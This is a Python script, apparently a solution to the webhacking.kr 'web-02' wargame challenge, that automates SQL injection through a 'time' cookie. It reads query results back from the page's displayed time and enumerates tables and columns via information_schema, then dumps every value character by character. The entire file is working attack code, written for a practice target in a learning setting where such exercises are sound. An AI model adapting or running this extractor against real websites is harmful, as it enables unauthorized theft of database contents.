import urllib.request

sid = ""	# 세션 ID 값
cookie = "time=({});PHPSESSID=" + sid
pre = {
    "count": "select count({}) from {} where {}",
    "len": "select length({}) from {} where {} limit {},1",
    "data": "select ascii(substring({}, 1)) from {} where {} limit {},1"
}


# 쿼리문 수행
def inject(query):
    url = "https://webhacking.kr/challenge/web-02/"
    req = urllib.request.Request(url)
    req.add_header("Cookie", cookie.format(query))
    res = urllib.request.urlopen(req)
    read = str(res.read().decode("utf-8")).split()
    time = list(map(lambda x: int(x), read[2].split(":")))
    return (60 * time[1]) + time[2]


# 데이터 개수 -> 각 데이터 길이 -> 한 글자씩 데이터 추출
def get_data(column, table, where):
    result = {}
    query = pre["count"].format(column, table, where)
    cnt = inject(query)
    print(query)
    print(cnt)
    if cnt > 20:
        return "Unavailable"
    for i in range(cnt):
        data = ""
        query = pre["len"].format(column, table, where, i)
        length = inject(query)
        print(query)
        print(length)
        # limit은 첫 인덱스가 0, substirng 은 1부터 시작이다...
        for j in range(1, length+1):
            query = pre["data"].format(column + "," + str(j), table, where, i)
            data += chr(inject(query))
            print(query)
            print(data)
        if where == "true":
            return data
        result[data] = {}
    return result


def get_tables():
    tables = get_data("table_name", "information_schema.tables", "table_schema=database()")
    for table in tables.keys():
        tables[table] = get_data("column_name", "information_schema.columns", "table_name=\"{}\"".format(table))
    return tables


def start_injection():
    tables = get_tables()
    print("[tables]")
    print(tables)
    for table in tables.keys():
        for col in tables[table]:
            data = get_data(col, table, "true")
            tables[table][col] = data
    print(tables)


if __name__ == "__main__":
    start_injection()